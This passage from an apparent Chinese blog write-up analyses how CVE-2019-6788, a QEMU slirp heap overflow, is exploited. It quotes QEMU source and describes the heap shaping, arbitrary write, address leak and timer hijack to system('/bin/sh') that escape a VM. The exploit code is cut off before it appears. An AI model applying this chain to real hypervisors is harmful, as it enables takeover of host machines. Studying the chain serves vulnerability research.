class="line">		     l = l-&gt;next) &#123;</span><br><span class="line">            fp = container_of(l, <span class="keyword">struct</span> ipq, ip_link);</span><br><span class="line">            <span class="keyword">if</span> (ip-&gt;ip_id == fp-&gt;ipq_id &amp;&amp;</span><br><span class="line">                    ip-&gt;ip_src.s_addr == fp-&gt;ipq_src.s_addr &amp;&amp;</span><br><span class="line">                    ip-&gt;ip_dst.s_addr == fp-&gt;ipq_dst.s_addr &amp;&amp;</span><br><span class="line">                    ip-&gt;ip_p == fp-&gt;ipq_p)</span><br><span class="line">		    <span class="keyword">goto</span> found;</span><br><span class="line">        &#125;</span><br><span class="line">        fp = <span class="literal">NULL</span>;</span><br><span class="line">	found:</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Adjust ip_len to not reflect header,</span></span><br><span class="line"><span class="comment">		 * set ip_mff if more fragments are expected,</span></span><br><span class="line"><span class="comment">		 * convert offset of this to bytes.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		ip-&gt;ip_len -= hlen;</span><br><span class="line">		<span class="keyword">if</span> (ip-&gt;ip_off &amp; IP_MF)</span><br><span class="line">		  ip-&gt;ip_tos |= <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		  ip-&gt;ip_tos &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		ip-&gt;ip_off &lt;&lt;= <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If datagram marked as having more fragments</span></span><br><span class="line"><span class="comment">		 * or if this is not the first fragment,</span></span><br><span class="line"><span class="comment">		 * attempt reassembly; if it succeeds, proceed.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (ip-&gt;ip_tos &amp; <span class="number">1</span> || ip-&gt;ip_off) &#123;</span><br><span class="line">			ip = ip_reass(slirp, ip, fp);</span><br><span class="line">                        <span class="keyword">if</span> (ip == <span class="literal">NULL</span>)</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			m = dtom(slirp, ip);</span><br><span class="line">		&#125; <span class="keyword">else</span></span><br><span class="line">			<span class="keyword">if</span> (fp)</span><br><span class="line">		   	   ip_freef(slirp, fp);</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		ip-&gt;ip_len -= hlen;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> ip *</span><br><span class="line"><span class="title function_">ip_reass</span><span class="params">(Slirp *slirp, <span class="keyword">struct</span> ip *ip, <span class="keyword">struct</span> ipq *fp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If first fragment to arrive, create a reassembly queue.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">        <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">t</span> =</span> m_get(slirp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> mbuf *</span><br><span class="line"><span class="title function_">m_get</span><span class="params">(Slirp *slirp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">register</span> <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m</span>;</span></span><br><span class="line">	<span class="type">int</span> flags = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	DEBUG_CALL(<span class="string">&quot;m_get&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (slirp-&gt;m_freelist.qh_link == &amp;slirp-&gt;m_freelist) &#123;</span><br><span class="line">                m = g_malloc(SLIRP_MSIZE);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从代码逻辑来看，如果<code>flag</code>没有设置<code>IP_DF</code>即表示需要进行分段，那么会在当前的链表中首先查找是否存在相应的数据包，如果没找到即将<code>fp</code>设置为空，表示该数据包是相应数据流的第一个数据包，接着调用<code>ip_reass</code>函数，如果<code>fp=NULL</code>，那么就会调用<code>m_get</code>函数为其分配一个<code>mbuf</code>结构体，大小为<code>SLIRP_MSIZE=0x668</code>，即申请了一个<code>0x670</code>大小的堆块，并将其放入到链表中。</p>
<p>也就是说我们可以构造数据包使得其<code>IP_DF</code>为空，那么就会分配<code>0x670</code>大小的堆块。这样就实现了<code>malloc</code>原语。</p>
<h3 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h3><p>任意地址写的构造主要基于堆溢出以及<code>ip_reass</code>函数，关键的代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">ip_input</span><span class="params">(<span class="keyword">struct</span> mbuf *m)</span></span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If offset or IP_MF are set, must reassemble.</span></span><br><span class="line"><span class="comment">	 * Otherwise, nothing need be done.</span></span><br><span class="line"><span class="comment">	 * (We could look in the reassembly queue to see</span></span><br><span class="line"><span class="comment">	 * if the packet was previously fragmented,</span></span><br><span class="line"><span class="comment">	 * but it&#x27;s not worth the time; just let them time out.)</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * XXX This should fail, don&#x27;t fragment yet</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (ip-&gt;ip_off &amp;~ IP_DF) &#123;</span><br><span class="line">	  <span class="keyword">register</span> <span class="class"><span class="keyword">struct</span> <span class="title">ipq</span> *<span class="title">fp</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">qlink</span> *<span class="title">l</span>;</span></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Look for queue of fragments</span></span><br><span class="line"><span class="comment">		 * of this datagram.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">for</span> (l = slirp-&gt;ipq.ip_link.next; l != &amp;slirp-&gt;ipq.ip_link;</span><br><span class="line">		     l = l-&gt;next) &#123;</span><br><span class="line">            fp = container_of(l, <span class="keyword">struct</span> ipq, ip_link);</span><br><span class="line">            <span class="keyword">if</span> (ip-&gt;ip_id == fp-&gt;ipq_id &amp;&amp;</span><br><span class="line">                    ip-&gt;ip_src.s_addr == fp-&gt;ipq_src.s_addr &amp;&amp;</span><br><span class="line">                    ip-&gt;ip_dst.s_addr == fp-&gt;ipq_dst.s_addr &amp;&amp;</span><br><span class="line">                    ip-&gt;ip_p == fp-&gt;ipq_p)</span><br><span class="line">		    <span class="keyword">goto</span> found;</span><br><span class="line">        &#125;</span><br><span class="line">        fp = <span class="literal">NULL</span>;</span><br><span class="line">	found:</span><br><span class="line">		ip-&gt;ip_len -= hlen;</span><br><span class="line">		<span class="keyword">if</span> (ip-&gt;ip_off &amp; IP_MF)</span><br><span class="line">		  ip-&gt;ip_tos |= <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		  ip-&gt;ip_tos &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		ip-&gt;ip_off &lt;&lt;= <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If datagram marked as having more fragments</span></span><br><span class="line"><span class="comment">		 * or if this is not the first fragment,</span></span><br><span class="line"><span class="comment">		 * attempt reassembly; if it succeeds, proceed.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (ip-&gt;ip_tos &amp; <span class="number">1</span> || ip-&gt;ip_off) &#123;</span><br><span class="line">			ip = ip_reass(slirp, ip, fp);</span><br><span class="line">                        <span class="keyword">if</span> (ip == <span class="literal">NULL</span>)</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> ip *</span><br><span class="line"><span class="title function_">ip_reass</span><span class="params">(Slirp *slirp, <span class="keyword">struct</span> ip *ip, <span class="keyword">struct</span> ipq *fp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">register</span> <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m</span> =</span> dtom(slirp, ip);</span><br><span class="line">	<span class="keyword">register</span> <span class="class"><span class="keyword">struct</span> <span class="title">ipasfrag</span> *<span class="title">q</span>;</span></span><br><span class="line">	<span class="type">int</span> hlen = ip-&gt;ip_hl &lt;&lt; <span class="number">2</span>;</span><br><span class="line">	<span class="type">int</span> i, next;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Reassembly is complete; concatenate fragments.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">    q = fp-&gt;frag_link.next;</span><br><span class="line">	m = dtom(slirp, q);</span><br><span class="line"></span><br><span class="line">	q = (<span class="keyword">struct</span> ipasfrag *) q-&gt;ipf_next;</span><br><span class="line">	<span class="keyword">while</span> (q != (<span class="keyword">struct</span> ipasfrag*)&amp;fp-&gt;frag_link) &#123;</span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">t</span> =</span> dtom(slirp, q);</span><br><span class="line">	  q = (<span class="keyword">struct</span> ipasfrag *) q-&gt;ipf_next;</span><br><span class="line">	  m_cat(m, t);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copy data from one mbuf to the end of</span></span><br><span class="line"><span class="comment"> * the other.. if result is too big for one mbuf, allocate</span></span><br><span class="line"><span class="comment"> * an M_EXT data segment</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">m_cat</span><span class="params">(<span class="keyword">struct</span> mbuf *m, <span class="keyword">struct</span> mbuf *n)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If there&#x27;s no room, realloc</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (M_FREEROOM(m) &lt; n-&gt;m_len)</span><br><span class="line">		m_inc(m, m-&gt;m_len + n-&gt;m_len);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(m-&gt;m_data+m-&gt;m_len, n-&gt;m_data, n-&gt;m_len);</span><br><span class="line">	m-&gt;m_len += n-&gt;m_len;</span><br><span class="line"></span><br><span class="line">	m_free(n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到在<code>ip_input</code>函数中，当数据包的标志位<code>IP_MF</code>不为<code>1</code>即数据包是最后一个切片数据包的时候会调用<code>ip_reass</code>函数，在函数中会调用<code>m_cat</code>函数将数据包组合起来。关键的代码就是<code>memcpy(m-&gt;m_data+m-&gt;m_len, n-&gt;m_data, n-&gt;m_len)</code>，如果我们可以利用堆溢出覆写<code>m_data</code>，就可以实现将可控的数据写入到<code>m_data+m_len</code>处。</p>
<p><code>exp</code>中实现任意写的逻辑如下，首先利用<code>malloc</code>原语将堆清空。接着利用<code>socket</code>与<code>113</code>端口建立连接，申请出可以溢出的结构体<code>so_rcv</code>结构体。紧接着在后面分配一个<code>ip</code>切片数据包<code>mbuf</code>，其<code>id</code>为<code>0xdead</code>。由于堆排布，该数据包是紧贴着<code>so_rcv</code>的，可以利用堆溢出覆盖<code>mbuf</code>中的<code>m_data</code>指针。最后再次发送<code>0xdead</code>并且<code>MF</code>标志位为<code>0</code>的数据包，触发<code>memcpy</code>函数将数据拷贝到<code>m_data</code>指针处，实现任意地址写。</p>
<h3 id="地址泄漏"><a href="#地址泄漏" class="headerlink" title="地址泄漏"></a>地址泄漏</h3><p>泄漏地址的方法是利用<code>icmp</code>响应包实现的。我们先来看一下<code>tcp</code>协议和<code>icmp</code>协议。</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/CVE-2019-6788-Qemu%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E5%88%86%E6%9E%90/2.jpg" alt="图片无法显示，请联系作者" title=" ">

<p><code>tcp</code>数据包的数据结构源码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> tcphdr slirp_tcphdr</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> &#123;</span></span><br><span class="line">	<span class="type">uint16_t</span> th_sport;              <span class="comment">/* source port */</span></span><br><span class="line">	<span class="type">uint16_t</span> th_dport;              <span class="comment">/* destination port */</span></span><br><span class="line">	tcp_seq	th_seq;			<span class="comment">/* sequence number */</span></span><br><span class="line">	tcp_seq	th_ack;			<span class="comment">/* acknowledgement number */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HOST_WORDS_BIGENDIAN</span></span><br><span class="line">	<span class="type">uint8_t</span>	th_off:<span class="number">4</span>,		<span class="comment">/* data offset */</span></span><br><span class="line">		th_x2:<span class="number">4</span>;		<span class="comment">/* (unused) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	<span class="type">uint8_t</span>	th_x2:<span class="number">4</span>,		<span class="comment">/* (unused) */</span></span><br><span class="line">		th_off:<span class="number">4</span>;		<span class="comment">/* data offset */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">uint8_t</span> th_flags;</span><br><span class="line">	<span class="type">uint16_t</span> th_win;                <span class="comment">/* window */</span></span><br><span class="line">	<span class="type">uint16_t</span> th_sum;                <span class="comment">/* checksum */</span></span><br><span class="line">	<span class="type">uint16_t</span> th_urp;                <span class="comment">/* urgent pointer */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>icmp</code>数据包的数据结构表如下</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/CVE-2019-6788-Qemu%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E5%88%86%E6%9E%90/image-20210130201723565.png" alt="图片无法显示，请联系作者" title=" ">

<p>源码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">icmp</span> &#123;</span></span><br><span class="line">	u_char	icmp_type;		<span class="comment">/* type of message, see below */</span></span><br><span class="line">	u_char	icmp_code;		<span class="comment">/* type sub code */</span></span><br><span class="line">	u_short	icmp_cksum;		<span class="comment">/* ones complement cksum of struct */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		u_char ih_pptr;			<span class="comment">/* ICMP_PARAMPROB */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">ih_gwaddr</span>;</span>	<span class="comment">/* ICMP_REDIRECT */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">ih_idseq</span> &#123;</span></span><br><span class="line">			u_short	icd_id;</span><br><span class="line">			u_short	icd_seq;</span><br><span class="line">		&#125; ih_idseq;</span><br><span class="line">		<span class="type">int</span> ih_void;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* ICMP_UNREACH_NEEDFRAG -- Path MTU Discovery (RFC1191) */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">ih_pmtu</span> &#123;</span></span><br><span class="line">			u_short ipm_void;</span><br><span class="line">			u_short ipm_nextmtu;</span><br><span class="line">		&#125; ih_pmtu;</span><br><span class="line">	&#125; icmp_hun;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	icmp_pptr	icmp_hun.ih_pptr</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	icmp_gwaddr	icmp_hun.ih_gwaddr</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	icmp_id		icmp_hun.ih_idseq.icd_id</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	icmp_seq	icmp_hun.ih_idseq.icd_seq</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	icmp_void	icmp_hun.ih_void</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	icmp_pmvoid	icmp_hun.ih_pmtu.ipm_void</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	icmp_nextmtu	icmp_hun.ih_pmtu.ipm_nextmtu</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">id_ts</span> &#123;</span></span><br><span class="line">			n_time its_otime;</span><br><span class="line">			n_time its_rtime;</span><br><span class="line">			n_time its_ttime;</span><br><span class="line">		&#125; id_ts;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">id_ip</span>  &#123;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">ip</span> <span class="title">idi_ip</span>;</span></span><br><span class="line">			<span class="comment">/* options and then 64 bits of data */</span></span><br><span class="line">		&#125; id_ip;</span><br><span class="line">		<span class="type">uint32_t</span>	id_mask;</span><br><span class="line">		<span class="type">char</span>		id_data[<span class="number">1</span>];</span><br><span class="line">	&#125; icmp_dun;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	icmp_otime	icmp_dun.id_ts.its_otime</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	icmp_rtime	icmp_dun.id_ts.its_rtime</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	icmp_ttime	icmp_dun.id_ts.its_ttime</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	icmp_ip		icmp_dun.id_ip.idi_ip</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	icmp_mask	icmp_dun.id_mask</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	icmp_data	icmp_dun.id_data</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这里泄漏地址的方法如下</p>
<ol>
<li>首先通过堆溢出覆写<code>m_data</code>指针的低三位为<code>0xb00</code>（因为<code>heap</code>所在的内存页虚拟地址为<code>0Xxx000000</code>），不会存在越界的问题</li>
<li>通过任意地址写将伪造的<code>icmp</code>数据包写入到<code>0x7fxxxb00+0x318+0x14+0x14</code>处（<code>eth,ip</code>报头为<code>0x14</code>字节，<code>m_len</code>为<code>0x318</code>）</li>
<li>再来一次任意写，先<code>connect</code>得到<code>so_rcv</code>，再发送一个<code>icmp</code>数据包，其中<code>MF=1</code>，那么<code>mbuf</code>就会被分配到<code>so_rcv</code>的后面</li>
<li>覆写<code>m_data</code>改为<code>0x7fxxxb00+0x318+0x14+0x14</code>即伪造的<code>icmp</code>数据包的位置</li>
<li>发送一个<code>MF=0</code>的数据包触发<code>icmp</code>响应，得到伪造的<code>icmp</code>数据包及后面的脏数据，从而泄漏出二进制基址和堆地址</li>
</ol>
<h3 id="劫持控制流"><a href="#劫持控制流" class="headerlink" title="劫持控制流"></a>劫持控制流</h3><p>最后劫持控制流的方法就是利用<code>QemuTimer</code>，<code>bss</code>数据段中存在一个全局变量<code>main_loop_tlg</code>，类型为<code>QEMUTimerList</code>，其成员变量<code>active_tiemrs</code>为<code>QEMUTimer*</code>类型的变量，我们在堆中伪造这两个变量，覆写<code>bss</code>中的全局变量，伪造<code>cb</code>为<code>system.plt</code>，伪造<code>opaque</code>为<code>/bin/sh</code>，那么当<code>expire_time</code>过完之后就会触发<code>timer</code>的调用，发生如下的调用链</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timer_mod-&gt;timer_mod_ns-&gt;timerlist_notify-&gt;notify_cb(notify_opaque, clock-&gt;type)</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// util/qemu-timer.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimerList</span> &#123;</span></span><br><span class="line">    QEMUClock *clock;</span><br><span class="line">    QemuMutex active_timers_lock;</span><br><span class="line">    QEMUTimer *active_timers;</span><br><span class="line">    QLIST_ENTRY(QEMUTimerList) <span class="built_in">list</span>;</span><br><span class="line">    QEMUTimerListNotifyCB *notify_cb;</span><br><span class="line">    <span class="type">void</span> *notify_opaque;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* lightweight method to mark the end of timerlist&#x27;s running */</span></span><br><span class="line">    QemuEvent timers_done_ev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// include/qemu/timer.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span> &#123;</span></span><br><span class="line">    <span class="type">int64_t</span> expire_time;        <span class="comment">/* in nanoseconds */</span></span><br><span class="line">    QEMUTimerList *timer_list;</span><br><span class="line">    QEMUTimerCB *cb;  <span class="comment">// 函数指针</span></span><br><span class="line">    <span class="type">void</span> *opaque;     <span class="comment">// 参数</span></span><br><span class="line">    QEMUTimer *next;</span><br><span class="line">    <span class="type">int</span> attributes;</span><br><span class="line">    <span class="type">int</span> scale;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这个<code>notify_cb</code>就是<code>cb</code>即<code>call back</code>函数，<code>notify_opaque</code>就是<code>opaque</code>。</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p><code>raycp</code>师傅的<code>exp</code>如下，就使用的这个<code>exp</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span 